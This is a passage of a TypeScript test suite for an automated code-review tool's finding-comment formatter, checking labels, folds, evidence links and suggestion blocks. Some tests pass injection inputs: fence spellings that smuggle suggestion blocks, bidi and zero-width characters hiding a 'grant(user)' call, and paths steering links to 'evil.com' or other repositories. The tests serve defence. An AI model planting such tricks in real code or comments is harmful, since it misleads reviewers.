import * as core from '@actions/core';
import { randomBytes } from 'crypto';

import { ApprovalHeld, authorClearRole, buildDashboard, capNotes, hasWriteAccess, formatFoundAgainReply, formatUnreviewedNotice, formatVariantReply, formatRaisedReply, titleToSlug, formatBlockingPriorThreads, formatFindingComment, unreadRecordsLine, formatStatsOneLiner, mapVerdictToEvent, BOT_LOGIN, BotIdentity, isBotLogin, BOT_MARKER, REVIEW_COMPLETE_MARKER, CANCELLED_MARKER, VERSION_MARKER_PREFIX, MANKI_VERSION, roundSentence, roundSummary, postReview, resolveReferences, sanitizeMarkdown, sanitizeFilePath, truncateBody, dynamicFence, fetchFileContents, fetchLinkedIssues, updateProgressComment, postProgressComment, updateProgressDashboard, dismissPreviousReviews, reactToIssueComment, reactToReviewComment, fetchPRDiff, fetchInterRoundDiff, fetchConfigFile, readConfigFile, fetchRepoContext, isApprovedOnCommit, hasBotReviewOnCommit, findBotReviewOnCommit, markOwnProgressCommentCancelled, extractVersionFromBody, fetchPRComments, INDENT, fetchStandingVerdict, SupersededError, markProgressCommentSuperseded, retireSettingsBlocks, setSettingsBlock, showSettings, fetchBlobShas, formatOpenBlockers, fetchCommitsSince } from './github';
import { parseSettingsBlock, renderSettingsBlock, SettingsView, withSettingsBlock } from './settings';
import { DashboardData, DisprovedFinding, Finding, FindingFingerprintEntry, GradeChange, ParsedDiff, ReviewMetadata, ReviewResult, RoundContext, roundContextToFlatAliases } from './types';
import { codeTokensFromDiff, highlightCode } from './highlight';
import { makeFindingFingerprintEntry, paginateSinglePage, TEST_BOT, TEST_LINKS } from './test-utils';
import { withMarkers } from './utils';
import { extractReviewRecords } from './review-record';
import { parseFindingFromComment, PreviousFinding } from './recap';

const CUSTOM_APP_BOT: BotIdentity = { logins: ['acme-reviewer[bot]'] };
const PAT_BOT: BotIdentity = { logins: [...TEST_BOT.logins, 'review-user'] };

const EMOJI_RE = /\p{Extended_Pictographic}/u;
const DASH_SEPARATOR_RE = / [—–] | -- /;

function findingData(comment: string): Record<string, unknown> {
  const match = comment.match(/<!-- manki-finding: (.+?) -->/);
  expect(match).not.toBeNull();
  return JSON.parse(match![1]);
}

/** Returns the info string of each fence that opens a code block in `markdown`, per CommonMark, through quote and list markers. */
function fenceOpeners(markdown: string): string[] {
  const infos: string[] = [];
  let open: string | undefined;
  for (const line of markdown.replace(/<!--[\s\S]*?-->/g, '').split('\n')) {
    const [, run, info] = line.replace(/^(?:[ \t]*(?:>|[-*+]|\d+[.)])[ \t]?)*/, '').match(/^ {0,3}(`{3,}|~{3,})(.*)$/) ?? [];
    if (!run) continue;
    if (!open && (run[0] === '~' || !info.includes('`'))) {
      open = run;
      infos.push(info.trim());
    } else if (open && run[0] === open[0] && run.length >= open.length && !info.trim()) {
      open = undefined;
    }
  }
  return infos;
}

/** The "About this review" fold that closes a review body, for a commit with no round context. */
function aboutFold(commitLink: string): string {
  return `<details>\n<summary>About this review</summary>\n\n- Reviewed ${commitLink}\n- [How Manki reviews](https://github.com/manki-review/manki/blob/main/docs/how-reviews-work.md)\n\n</details>`;
}

function suggestionBlocks(comment: string): string[] {
  return [...comment.matchAll(/^(`{3,})suggestion\n([\s\S]*?)\n\1$/gm)].map(m => m[2]);
}

describe('formatFindingComment', () => {
  const links = TEST_LINKS;
  const render = (finding: Finding): string => formatFindingComment(finding, links);
  const baseFinding: Finding = {
    severity: 'blocker',
    title: 'Null pointer dereference',
    file: 'src/main.ts',
    line: 42,
    description: 'This code will throw if the value is undefined.',
    reviewers: ['Security & Correctness'],
  };

  it.each([
    ['blocker', '\u{1F6AB} **Blocker**', undefined],
    ['warning', '\u26A0\uFE0F **Warning**', undefined],
    ['note', '\u2728 **Note, not blocking**', undefined],
    ['warning', '\u26A0\uFE0F **Warning** (CodeQL)', 'CodeQL'],
    ['note', '\u2728 **Note, not blocking** (eslint)', 'eslint'],
  ] as const)('opens a %s finding with its severity icon and label, and no other emoji', (severity, label, toolSource) => {
    const comment = render({ ...baseFinding, severity, toolSource });
    // A blocking finding says what goes wrong, and any other says why it is worth changing.
    const said = severity === 'blocker' || severity === 'warning' ? '**What goes wrong:**' : '**Why:**';
    expect(comment.startsWith(`${label}\n\n**${baseFinding.title}**\n\n${said} ${baseFinding.description}`)).toBe(true);
    expect(comment.slice(label.length)).not.toMatch(EMOJI_RE);
    expect(comment).not.toMatch(DASH_SEPARATOR_RE);
    expect(comment).not.toContain('Manki could not confirm');
    expect(comment).toContain(`<!-- manki:${severity}:Null-pointer-dereference -->`);
  });

  it('opens with severity, category and effort on one line when the judge set them', () => {
    const comment = render({ ...baseFinding, category: 'data', effort: 'larger', toolSource: 'CodeQL' });
    expect(comment.startsWith(`\u{1F6AB} **Blocker** (CodeQL) · Data integrity · Larger change\n\n**${baseFinding.title}**\n\n`)).toBe(true);
    expect(render({ ...baseFinding, effort: 'quick' }).startsWith('\u{1F6AB} **Blocker** · Quick fix\n\n')).toBe(true);
  });

  it('adds a note under the title only when the finding was not confirmed', () => {
    const comment = render({ ...baseFinding, severity: 'warning', checkStatus: 'unconfirmed' });
    expect(comment.startsWith(`\u26A0\uFE0F **Warning**\n\n**${baseFinding.title}**\n\n_Manki could not confirm this, so please check it._\n\n**What goes wrong:** ${baseFinding.description}`)).toBe(true);
    expect(comment).not.toMatch(/\u{1F534}|\u{1F7E0}|\u{1F7E1}/u);
    for (const checkStatus of ['proven', 'confirmed'] as const) {
      expect(render({ ...baseFinding, checkStatus })).not.toContain('Manki could not confirm');
    }
  });

  it('renders a short code fix as a suggestion block', () => {
    const comment = render({ ...baseFinding, suggestedFix: 'if (value != null) { use(value); }' });
    expect(suggestionBlocks(comment)).toEqual(['if (value != null) { use(value); }']);
    expect(comment).not.toContain('<summary>Suggested fix</summary>');
  });

  it('shows what goes wrong, then folds the fix, why it matters and the checks, with the double-check last', () => {
    const longFix = 'const a = 1;\nconst b = 2;\nconst c = 3;\nconst d = 4;\nconst e = 5;';
    const sentence = (n: number) => `Sentence ${n} explains one more part of why the cache key collides when two tenants share a name.`;
    const description = [1, 2, 3, 4, 5].map(sentence).join(' ');
    const evidence = { checks: ['src/util.ts:10 returns the bare name'], proof: [] };
    const refutation = { outcome: 'confirmed' as const, reason: 'No caller adds the tenant.', files: ['src/util.ts'], codeDigest: 'abc' };
    const comment = render({ ...baseFinding, description, howToFix: 'Key the cache by tenant.', suggestedFix: longFix, evidence, refutation });
    expect(comment).toContain([
      `**What goes wrong:** ${sentence(1)} ${sentence(2)} ${sentence(3)}`,
      '',
      '<!-- manki-checks -->',
      '<details>',
      '<summary>How to fix it, why, and 1 place read · double-checked</summary>',
      '',
      '**How to fix it**',
      'Key the cache by tenant.',
      '',
      `\`\`\`ts\n${longFix}\n\`\`\``,
      '',
      '**Why it matters**',
      `${sentence(4)} ${sentence(5)}`,
      '',
      '**Checked in the code**',
      'Returns the bare name',
      links.linkTo('src/util.ts', 9, 13),
      '',
      '**Double-checked**',
      'Manki tried to disprove this by reading the code and could not. No caller adds the tenant.',
      '',
      '</details>',
    ].join('\n'));
    expect(suggestionBlocks(comment)).toEqual([]);

    // A confirmed rule finding names the rule first, as code spans, and says when the rule is why it blocks.
    const rule = { file: 'CONTRIBUTING.md', quote: 'Every new endpoint must be\nlisted in `docs/api.md`. @everyone <!-- x --> <b>' };
    const ruleLine = 'This PR breaks a required rule of `CONTRIBUTING.md`: `` Every new endpoint must be listed in `docs/api.md`. @everyone <\u200B!\u200B-\u200B- x -\u200B-\u200B> <b> ``';
    // The rule raised it to a blocker, so the rule is why it blocks.
    const byRule = { cell: { row: 'improvement' as const, column: 'normal' as const }, gradePath: [{ from: 'note' as const, to: 'blocker' as const, by: 'rule' as const }] };
    const blocksByRule = `${ruleLine} It blocks because this repository sets \`review.rules: block\`.`;
    const ruleBlocker = render({ ...baseFinding, evidence, rule: { ...rule, verdict: 'confirmed' }, ...byRule });
    expect(ruleBlocker).toContain(`<summary>How this was checked: 1 place read, breaks a repository rule</summary>\n\n**Repository rule**\n${blocksByRule}\n\n**Checked in the code**\n`);
    // So it is for a blocker cell a doubt held at a warning, and for a rule blocker a check gave back after a cap for want of proof.
    const held = { cell: { row: 'wrong' as const, column: 'normal' as const }, gradeIfConfirmed: 'blocker' as const, gradePath: [{ from: 'warning' as const, to: 'blocker' as const, by: 'rule' as const }] };
    expect(render({ ...baseFinding, evidence, rule: { ...rule, verdict: 'confirmed' }, ...held })).toContain(blocksByRule);
    const givenBack = [...byRule.gradePath, { from: 'blocker' as const, to: 'warning' as const, by: 'unproven' as const }, { from: 'warning' as const, to: 'blocker' as const, by: 'refutation' as const }];
    expect(render({ ...baseFinding, evidence, rule: { ...rule, verdict: 'confirmed' }, ...byRule, gradePath: givenBack })).toContain(blocksByRule);
    // A warning, and a blocker whose own damage blocks, name the rule without the reason for blocking.
    expect(render({ ...baseFinding, severity: 'warning', rule: { ...rule, verdict: 'confirmed' }, ...byRule, gradePath: [{ from: 'note', to: 'warning', by: 'rule' }] })).toContain(`<!-- manki-checks -->\n**Repository rule:** ${ruleLine}\n`);
    // A rule warning on code an earlier round reviewed says so under its title and names the rule the same way.
    const late = render({ ...baseFinding, severity: 'warning', origin: 'reviewed', tags: ['follow-up'], rule: { ...rule, verdict: 'confirmed' }, ...byRule, gradePath: [{ from: 'note', to: 'warning', by: 'rule' }] });
    expect(late).toContain("_An earlier round already reviewed these lines and missed this, and it doesn't block this PR._\n\n");
    expect(late).toContain(`<!-- manki-checks -->\n**Repository rule:** ${ruleLine}\n`);
    expect(render({ ...baseFinding, evidence, rule: { ...rule, verdict: 'confirmed' }, cell: { row: 'severe', column: 'normal' } })).toContain(`**Repository rule**\n${ruleLine}\n\n**Checked in the code**`);
    // A quote with a hidden character is not printed, and a rule the judge did not confirm gives no line.
    expect(render({ ...baseFinding, severity: 'warning', rule: { file: 'AGENTS.md', quote: 'Every\u202E change needs a test.', verdict: 'confirmed' } })).toContain('**Repository rule:** This PR breaks a required rule of `AGENTS.md`.\n');
    for (const verdict of ['no_requirement', 'not_broken', 'unproven', undefined] as const) {
      expect(render({ ...baseFinding, evidence, rule: { ...rule, verdict }, ...byRule })).not.toContain('rule');
    }

    // A committable suggestion stays open, so GitHub offers to commit it, and the fix in words goes in the fold.
    const suggested = render({ ...baseFinding, howToFix: 'Check for `null` first.', suggestedFix: 'if (value != null) { use(value); }', evidence });
    expect(suggested).toContain(`${baseFinding.description}\n\n\`\`\`suggestion\nif (value != null) { use(value); }\n\`\`\`\n\n<!-- manki-checks -->\n<details>\n<summary>How to fix it and 1 place read</summary>\n\n**How to fix it**\nCheck for \`null\` first.\n\n**Checked in the code**\n`);
    // A finding with no separate fix keeps the rest of its description as why it matters.
    expect(render({ ...baseFinding, description, evidence })).toContain(`<summary>Why it matters and 1 place read</summary>\n\n**Why it matters**\n${sentence(4)} ${sentence(5)}\n\n**Checked in the code**\n`);
    // A fold never holds a single line, so a one-line fix alone shows open, and a fix with nothing cited says so in the summary.
    expect(render({ ...baseFinding, howToFix: 'Check for `null` first.', reviewers: [] })).toContain('\n<!-- manki-checks -->\n**Fix:** Check for `null` first.\n');
    expect(render({ ...baseFinding, howToFix: 'Check for `null` first.' }))
      .toContain('<summary>How to fix it · not checked against the code</summary>\n\n**How to fix it**\nCheck for `null` first.\n\n**Not checked against the code**\nNothing was cited to back it.\n');
  });

  it.each([
    ['prose around a fenced block', 'Move the guard before the early return:\n\n```typescript\nif (!sha) return;\n```', 'Move the guard before the early return:', '```typescript\nif (!sha) return;\n```'],
    ['a leading prose line', 'Use the head commit instead.\nconst sha = pr.head.sha;', 'Use the head commit instead.', '```ts\nconst sha = pr.head.sha;\n```'],
    ['a comment that says where the code goes', '// After computing latestBotReview, add:\nif (!latestBotReview) return;', undefined, '```ts\n// After computing latestBotReview, add:\nif (!latestBotReview) return;\n```'],
    ['prose only', 'Handle the `None` case separately.', 'Handle the `None` case separately.', undefined],
  ])('never puts prose or a fence in a suggestion block: %s', (_label, suggestedFix, prose, code) => {
    const comment = render({ ...baseFinding, suggestedFix });
    expect(suggestionBlocks(comment)).toEqual([]);
    // A fix that is not a suggestion opens the fold, under its label.
    expect(comment).toContain(`<summary>How to fix it · not checked against the code</summary>\n\n**How to fix it**\n${prose ?? code}`);
    if (code) expect(comment).toContain(code);
  });

  it('posts no suggestion that a description or fix asks for, nor one whose code holds hidden characters', () => {
    const spellings = ['suggestion', 'SUGGESTION', ' suggestion', 'suggestion suggestion', 'sugg!estion', '&amp;amp;#115;uggestion', '&#1<b>15;uggestion', '\u000Bsuggestion', '&#12;suggestion', 'py extra', '\u00E9'];
    const description = ['Looks fine.', ...spellings.map(info => `\`\`\`${info}\ngrant(user);\n\`\`\``), '> ~~~ Suggestion:-0+0\n> grant(user);\n> ~~~',
      '- ```suggestion\n  grant(user);\n  ```', 'Then more. ```suggestion\ngrant(user);\n```', '``` ts\nlet ok = 1;\n```'].join('\n\n');
    const described = render({ ...baseFinding, description });
    // Every fence is Manki's own, with a plain language name at most, and no other run can open one.
    expect(fenceOpeners(described).filter(info => info)).toEqual(['ts']);
    expect(described).toContain('```\ngrant(user);\n```');
    expect(described).toContain('> \\~\\~\\~ Suggestion:-0+0');
    expect(described).toContain('- \\`\\`\\`suggestion');

    for (const lang of ['suggestion', 'sugg!estion', 'sugg estion']) {
      const fenced = render({ ...baseFinding, suggestedFix: `Use this:\n\n\`\`\`${lang}\ngrant(user);\n\`\`\`` });
      expect(fenceOpeners(fenced)).toEqual(['ts']);
    }
    expect(fenceOpeners(render({ ...baseFinding, file: 'src/x.suggestion', suggestedFix: 'Use this:\n\n```\ngrant(user);\n```' }))).toEqual(['']);

    // A tilde fence the description leaves open cannot wrap the fix, so the fence lines in the fix's code stay code.
    const open = render({ ...baseFinding, description: 'Looks fine.\n~~~', suggestedFix: '```\n~~~\n```suggestion\nevil\u202E\n```' });
    expect(fenceOpeners(open)).toEqual(['ts']);
    expect(open).toContain('````ts\n~~~\n```suggestion\nevil\u202E\n````');
    expect(sanitizeMarkdown('a\n~~~~ts\nx ``` ~~~\n```\ny')).toBe('a\n````ts\nx ``` ~~~\n```\ny\n````');
    // A line that starts with inline triple-backtick code stays prose, with its runs escaped.
    expect(sanitizeMarkdown('```suggestion``` fences slip through\nmore')).toBe('\\`\\`\\`suggestion\\`\\`\\` fences slip through\nmore');

    for (const hidden of ['if (isAdmin) { /* \u202E } \u2066 if (true) { */ grant(user); }', 'const ok\u200B = check(user);', 'const bell = "\u0007";', 'const { timeout,\u3164 } = query;', 'const data = "a\u{E0101}\uFE01";']) {
      const comment = render({ ...baseFinding, suggestedFix: hidden });
      expect(suggestionBlocks(comment)).toEqual([]);
      expect(comment).toContain(`\`\`\`ts\n${hidden}\n\`\`\``);
    }
    expect(suggestionBlocks(render({ ...baseFinding, suggestedFix: 'if (a) {\n\tuse(a);\n}' }))).toEqual(['if (a) {\n\tuse(a);\n}']);
    expect(suggestionBlocks(render({ ...baseFinding, suggestedFix: 'const ok = "\u2705\uFE0F";' }))).toEqual(['const ok = "\u2705\uFE0F";']);
  });

  it('suggests a prose line as is in a prose file', () => {
    const comment = render({ ...baseFinding, file: 'README.md', suggestedFix: 'Run the setup script first.' });
    expect(suggestionBlocks(comment)).toEqual(['Run the setup script first.']);
  });

  it('shows the title, at most three sentences and a suggestion under 700 visible characters, and collapses the rest', () => {
    const visible = (text: string) => text.replace(/<details>[\s\S]*?<\/details>/g, '').replace(/<!--[\s\S]*?-->/g, '').length;
    const sentence = (n: number) => `Sentence ${n} explains one more part of why the cache key collides when two tenants share a name.`;
    const long = render({ ...baseFinding, description: [1, 2, 3, 4, 5].map(sentence).join(' '), suggestedFix: 'const key = `${tenant}:${name}`;' });
    expect(long).toContain(`${sentence(1)} ${sentence(2)} ${sentence(3)}\n\n\`\`\`suggestion`);
    expect(long).toContain(`<details>\n<summary>Why it matters · not checked against the code</summary>\n\n**Why it matters**\n${sentence(4)} ${sentence(5)}\n\n`);
    expect(visible(long)).toBeLessThan(700);

    const wordy = render({ ...baseFinding, description: `${'A very long first sentence '.repeat(40)}ends here. Then more.` });
    expect(visible(wordy)).toBeLessThan(700);
    // A fold never holds a single sentence, so one sentence past the lead shows with it.
    const four = render({ ...baseFinding, description: [1, 2, 3, 4].map(sentence).join(' ') });
    expect(four).toContain(`${sentence(3)} ${sentence(4)}`);
    expect(four).not.toContain('Why it matters');
    const oneLong = render({ ...baseFinding, description: `${'A very long only sentence '.repeat(40)}ends here.` });
    expect(visible(oneLong)).toBeLessThan(700);
    expect(oneLong).toContain('**Why it matters**\nA very long only sentence');
    // A description with no text before its code shows no empty label.
    expect(render({ ...baseFinding, description: '' })).not.toContain('What goes wrong');
    expect(render({ ...baseFinding, description: '```ts\nuse(value);\n```\nThen more.' })).not.toContain('What goes wrong');
    // A description that opens with a list gets the label on its own line, so the list marker stays a marker.
    expect(render({ ...baseFinding, description: '- It throws.\n- It logs.' })).toContain('**What goes wrong:**\n\n- It throws.\n- It logs.');
    expect(wordy).toContain('**Why it matters**\nA very long first sentence');

    expect(render(baseFinding)).not.toContain('<details>');
  });

  it('collapses "How this was checked" with the own line, up to three code previews, the rest as links and the refutation last', () => {
    const link = (file: string, start: number, end = start) => links.linkTo(file, start, end);
    const comment = render({
      ...baseFinding,
      evidence: {
        checks: [
          'src/main.ts:42 reads `value` from the request',
          '`src/util.ts`:10 returns `undefined` for a missing key',
          'src/util.ts:12-13: passes it on unchanged',
          'src/main.ts:2 imports `value`',
          'src/main.ts:30-39 has no guard',
          'src/other.ts:5 calls it again',
          'grep `value ==` under src:\n```\nsrc/x.ts:1: no\n```',
        ],
        proof: ['src/main.ts:42', 'src/util.ts:30'],
        emptySearch: 'grep `value == null` under src: no match',
      },
      refutation: { outcome: 'confirmed', reason: 'No caller checks `value` first.', proof: ['src/main.ts:42'], files: ['src/main.ts'], codeDigest: 'abc' },
    });

    expect(comment.match(/<!-- manki-checks -->\n<details>\n<summary>How this was checked: [^<]*<\/summary>\n\n[\s\S]*?\n\n<\/details>/)![0]).toBe([
      '<!-- manki-checks -->',
      '<details>',
      '<summary>How this was checked: 7 places read, 2 other checks, double-checked</summary>',
      '',
      '**Checked in the code**',
      'On the commented line: Reads `value` from the request',
      '',
      // Checks close together in one file share a preview, which starts one line above the first.
      '- Returns `undefined` for a missing key',
      '- Passes it on unchanged',
      '',
      link('src/util.ts', 9, 15),
      '',
      'Imports `value`',
      link('src/main.ts', 1, 5),
      '',
      // A long citation keeps its first lines.
      'Has no guard',
      link('src/main.ts', 29, 33),
      '',
      `- [\`src/other.ts:5\`](${link('src/other.ts', 5)}): Calls it again`,
      // A bare proving line shows its code, when the file was read.
      `- [\`src/util.ts:30\`](${link('src/util.ts', 30)}): \`line 30\``,
      '- Grep `value ==` under src: src/x.ts:1: no',
      '- Searched with no match: grep `value == null` under src: no match',
      '',
      '**Double-checked**',
      'Manki tried to disprove this by reading the code and could not. No caller checks `value` first.',
      '',
      '</details>',
    ].join('\n'));

    // A preview stays inside the file, and covers only the cited lines of a file whose length is unknown.
    expect(render({ ...baseFinding, evidence: { checks: ['src/util.ts:30 ends the file', 'src/unknown.ts:7-9 is outside the diff'], proof: [] } }))
      .toContain(`Ends the file\n${link('src/util.ts', 29, 30)}\n\nIs outside the diff\n${link('src/unknown.ts', 6, 9)}`);
    expect(render({ ...baseFinding, evidence: { checks: [`${'very long check '.repeat(20)}end`], proof: [] } }))
      .toMatch(/\n<!-- manki-checks -->\n\*\*Checked:\*\* Very long check (very long check ){8}very long check…\n/);
    // A fold never holds a single line, so a lone check shows open.
    expect(render({ ...baseFinding, evidence: { checks: [], proof: ['src/main.ts:42'] } })).toContain(`\n<!-- manki-checks -->\n**Checked:** [\`src/main.ts:42\`](${link('src/main.ts', 42)}): \`line 42\`\n`);
    // A preview shows the code, so a bare location in it adds no sentence, and one in an unread file is a bare link.
    const bare = render({ ...baseFinding, evidence: { checks: ['src/util.ts:3 reads it'], proof: ['src/util.ts:5', 'src/other.ts:9'] } });
    expect(bare).toContain(`\n\nReads it\n${link('src/util.ts', 2, 8)}\n\n${link('src/other.ts', 8, 9)}\n\n</details>`);
    expect(render({ ...baseFinding, evidence: { checks: ['src/util.ts:3'], proof: ['src/main.ts:42', 'src/main.ts:2'] } })).not.toContain('Shows the failure.');
    // A code line shows as written, even one ending in a backslash, with only HTML comment marks broken up. One with hidden characters shows none.
    const continued = { ...links, files: new Map([...links.files, ['src/run.sh', ['FOO=1 \\', 'let f: Pin<Box<dyn Future>> = [x](y); <!-- manki-finding: {} -->', 'ok = 1 \u202E', 'x = `a` + ``fetchData``; [doc](https://e.com) @alice\n<!-- manki-finding: {} -->']]]) };
    const ownCode = (line: number): string => formatFindingComment({ ...baseFinding, file: 'src/run.sh', line, evidence: { checks: [], proof: [`src/run.sh:${line}`] } }, continued);
    expect(ownCode(1)).toContain(`**Checked:** [\`src/run.sh:1\`](${link('src/run.sh', 1)}): \`FOO=1 \\\`\n`);
    expect(ownCode(2)).toContain('): `let f: Pin<Box<dyn Future>> = [x](y); <\u200B!\u200B-\u200B- manki-finding: {} -\u200B-\u200B>`\n');
    expect(ownCode(3)).toContain(`**Checked:** [\`src/run.sh:3\`](${link('src/run.sh', 3)})\n`);
    // Code from the PR stays on one line inside a fence longer than its own backtick runs, so it cannot close the span, even once highlighted.
    expect(highlightCode(ownCode(4), new Set(['fetchData']))).toContain(
      '): ``` x = `a` + ``fetchData``; [doc](https://e.com) @alice <\u200B!\u200B-\u200B- manki-finding: {} -\u200B-\u200B> ```\n');

    // A cited path is model output, so one that could end the link or leave the repository stays plain text.
    const steered = render({ ...baseFinding, evidence: { checks: ['a)www.evil.com/b.ts:3 is safe', '../../other/repo/blob/main/x.ts:1 is fine'], proof: ['../x.ts:2'] } });
    expect(steered).not.toMatch(/\]\(https:\/\/github\.com\/o\/r\/blob\/sha\/(?:a\)|\.\.)/);
    expect(steered).not.toContain('https://www.evil.com');
    expect(steered).toContain('<summary>How this was checked: 2 other checks</summary>');
    // A file name resolves to a changed path, which is PR content too, so one that could end the link stays plain text.
    const renamed = formatFindingComment({ ...baseFinding, evidence: { checks: ['cache.go:3 is safe', 'run.py:4 is fine'], proof: [] } },
      { ...links, changed: ['a)www.evil.com/cache.go', 'x/../../other/repo/blob/main/run.py'] });
    expect(renamed).not.toMatch(/\]\(https:\/\/github\.com\/o\/r\/blob\/sha\/(?:a\)|x\/\.\.)/);
    expect(renamed).toContain('- cache.go:3 is safe\n- run.py:4 is fine');

    // Reviewers who flag one problem cite one place in their own words, and each such check shows once.
    const merged = render({ ...baseFinding, evidence: { proof: [], checks: [
      'src/main.ts:42 reads `req.body.items` with no length check',
      'src/main.ts:40-42: `req.body.items` is read and passed on with no check',
      'src/util.ts:12 rejects `count < 0 || count > MAX_ITEMS`',
      'src/util.ts:12 `if (count < 0 || count > MAX_ITEMS) { throw new RangeError() }`',
      'src/util.ts:12: `if (count < 0 || count > MAX_ITEMS) { throw new RangeError() }`.',
      'golang/go:src/net/http/request.go:900 returns early for `r.URL == nil`',
      'golang/go:src/net/http/request.go:900 `if r.URL == nil { return }` in `ReadRequest`',
    ] } });
    expect(merged).toContain([
      '<summary>How this was checked: 2 places read, 1 other check</summary>',
      '',
      'On the commented line: Reads `req.body.items` with no length check',
      '',
      'Rejects `count < 0 || count > MAX_ITEMS`',
      link('src/util.ts', 11, 15),
      '',
      '- golang/go:src/net/http/request.go:900 returns early for `r.URL == nil`',
      '',
      '</details>',
    ].join('\n'));
    // Two checks of one line that quote different code both show, also when an earlier check that quotes both is dropped.
    expect(render({ ...baseFinding, evidence: { proof: [], checks: ['src/util.ts:12 reads `count`', 'src/util.ts:12 never resets `total`'] } }))
      .toContain(`- Reads \`count\`\n- Never resets \`total\`\n\n${link('src/util.ts', 11, 15)}`);
    const chained = render({ ...baseFinding, evidence: { proof: [], checks: [
      'src/util.ts:12 compares `count < max`', 'src/util.ts:10-14 `if (count < max) total += n`', 'src/util.ts:14 never resets `total += n`',
    ] } });
    expect(chained).toContain('- Compares `count < max`\n- Never resets `total += n`');
    expect(chained).not.toContain('if (count < max)');
    // Checks that quote no code are one check only when they say the same words.
    expect(render({ ...baseFinding, evidence: { proof: [], checks: ['src/util.ts:12 is safe', 'src/util.ts:12 is safe only for admins', 'src/util.ts:12: is safe.'] } }))
      .toContain(`- Is safe\n- Is safe only for admins\n\n${link('src/util.ts', 11, 15)}`);
    // An unlinked check is compared by what it says after its place, so a bare place hides nothing.
    expect(render({ ...baseFinding, evidence: { proof: [], checks: ['src/legacy/parser.py', 'src/legacy/parser.py swallows ValueError'] } }))
      .toContain('- src/legacy/parser.py\n- src/legacy/parser.py swallows ValueError');

    // A file cited by name alone gets the directories of the one changed or read file it names, and stays text when it names several or none.
    // A path that opens a check keeps its case, and every line a location lists is cited, with none left in the text.
    const named = formatFindingComment({ ...baseFinding, evidence: { proof: [], checks: [
      'cache.go:17-20 holds the lock while it calls `load`',
      'util.ts:3 drops the error',
      'config.py:5 reads the environment',
      'src/legacy/parser.py `parse()` swallows `ValueError`',
      'src/util.ts:3,25: `retries` and `timeout` are public fields',
      'app/routes.ts:8 is the other copy',
      'retry.rb:9 retries forever',
    ] } }, { ...links, changed: ['pkg/store/cache.go', 'lib/a/config.py', 'lib/b/config.py', 'packages/web/app/routes.ts'] });
    expect(named).toContain([
      '<summary>How this was checked: 5 places read, 3 other checks</summary>',
      '',
      'Holds the lock while it calls `load`',
      link('pkg/store/cache.go', 16, 20),
      '',
      '- Drops the error',
      '- `retries` and `timeout` are public fields',
      '',
      link('src/util.ts', 2, 6),
      '',
      // A path with directories is kept as written, even when a changed file's path ends with it.
      'Is the other copy',
      link('app/routes.ts', 7, 8),
      '',
      `- [\`src/util.ts:25\`](${link('src/util.ts', 25)}): \`line 25\``,
      '- config.py:5 reads the environment',
      '- src/legacy/parser.py `parse()` swallows `ValueError`',
      '- retry.rb:9 retries forever',
    ].join('\n'));

    // A finding that cites nothing says so, unless a tool reported it or it is an earlier round's.
    const unchecked = '**Not checked against the code.** Nothing was cited to back it.';
    expect(render({ ...baseFinding, evidence: { checks: [], proof: [] } })).toContain(unchecked);
    expect(render(baseFinding)).toContain(unchecked);
    expect(render(baseFinding)).not.toContain('How this was checked');
    expect(render({ ...baseFinding, toolSource: 'CodeQL' })).not.toContain(unchecked);
    expect(render({ ...baseFinding, reviewers: [] })).not.toContain(unchecked);

    // A disproof keeps a security warning, so its line names security findings, not only blockers, and links its proof.
    const disprovedFinding: Finding = {
      ...baseFinding, severity: 'warning', tags: ['security'], evidence: { checks: [], proof: ['src/main.ts:42'] },
      refutation: { outcome: 'disproved', reason: 'A comment says it is intended.', proof: ['src/main.ts:40', 'Makefile:7'], files: ['src/main.ts'], codeDigest: 'abc' },
    };
    const disproved = render(disprovedFinding);
    expect(render({ ...disprovedFinding, evidence: { checks: ['src/util.ts:3 marks it intended'], proof: [] } })).toContain('<summary>How this was checked: 1 place read, doubt found</summary>');
    expect(disproved).toContain(`**Doubt found:** Manki found a reason this may not happen, but a disproof alone never clears a blocker or a security finding, so please check it yourself. A comment says it is intended. See [\`src/main.ts:40\`](${link('src/main.ts', 40)}), [\`Makefile:7\`](${link('Makefile', 7)}).`);
    // An answer that the defect does not exist reads the same and links the same lines, whatever the premises of its check add up to.
    for (const outcome of ['unsettled', 'confirmed'] as const) {
      const noDefect: Finding = { ...disprovedFinding, refutation: { ...disprovedFinding.refutation!, outcome, defect: 'disproved', premises: [{ premise: 'A caller passes it', outcome, reason: 'r' }] } };
      expect(render(noDefect)).toContain(`so please check it yourself. A comment says it is intended. See [\`src/main.ts:40\`](${link('src/main.ts', 40)}), [\`Makefile:7\`](${link('Makefile', 7)}).`);
      expect(render(noDefect)).toContain('**Doubt found:** Manki found a reason this may not happen');
    }
    // A warning that breaks a confirmed rule outlives a disproof, and says why it stays.
    expect(render({ ...disprovedFinding, tags: [], rule: { file: 'AGENTS.md', quote: 'Every change needs a test.', verdict: 'confirmed' } }))
      .toContain('**Doubt found**\nThe finding stays, since Manki confirmed that it breaks the repository rule. This check disagrees about the damage or about the defect itself. A comment says it is intended.');
    // It also outlives a check's answer that the defect does not exist, with the same sentence, which holds whatever the check's reason says.
    const ruleWarning: Finding = { ...disprovedFinding, tags: [], rule: { file: 'AGENTS.md', quote: 'Every change needs a test.', verdict: 'confirmed' } };
    expect(render({ ...ruleWarning, refutation: { ...disprovedFinding.refutation!, defect: 'disproved' } }))
      .toContain('**Doubt found**\nThe finding stays, since Manki confirmed that it breaks the repository rule. This check disagrees about the damage or about the defect itself. A comment says it is intended.');
    // A rule the judge did not confirm keeps no finding, so its check reads like any other disproof.
    expect(render({ ...ruleWarning, rule: { ...ruleWarning.rule!, verdict: 'unproven' } })).toContain('Manki found a reason this may not happen, but a disproof alone');
    // The check that disproved it says why the finding stays, also when it is the second one.
    const unsettled = { outcome: 'unsettled' as const, reason: 'The caller is generated.', files: ['src/main.ts'], codeDigest: 'abc' };
    const keptBySecond = render({ ...ruleWarning, refutation: unsettled, pairRefutation: disprovedFinding.refutation });
    expect(keptBySecond).toContain('**Not settled**\nManki tried to disprove this by reading the code and could not decide. The caller is generated.');
    expect(keptBySecond).toContain('**Second check, on another model**\nThe finding stays, since Manki confirmed that it breaks the repository rule. This check disagrees about the damage or about the defect itself. A comment says it is intended.');
    // A check that confirmed a premise settles the disproof of the other, so nothing was dropped and no check says the rule kept it.
    const backed = { outcome: 'unsettled' as const, reason: 'One premise holds.', premises: [{ premise: 'A caller passes it', outcome: 'confirmed' as const, reason: 'r' }], files: ['src/main.ts'], codeDigest: 'abc' };
    expect(render({ ...ruleWarning, pairRefutation: backed })).not.toContain('The finding stays');
